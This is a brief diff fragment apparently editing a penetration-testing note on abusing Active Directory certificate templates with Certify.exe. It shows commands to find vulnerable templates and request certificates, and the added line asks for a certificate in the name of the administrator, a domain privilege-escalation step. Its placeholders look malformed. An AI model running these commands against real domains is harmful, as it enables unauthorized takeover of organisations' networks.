@@ -17,4 +17,4 @@ Certify.exe find vulnerable
 Certify.exe request /ca:DOMAIN-CA /template:VulnerableTemplate
 
 4️⃣ Export the Certificate as PFX:
-Certify.exe request /ca:DOMAIN-CA /template:VulnerableTemplate /pfx
+./certify.exe request /ca:dc.(domain.)\(domain)-DC-CA /template:vulnerable template /altname:(administrator*)
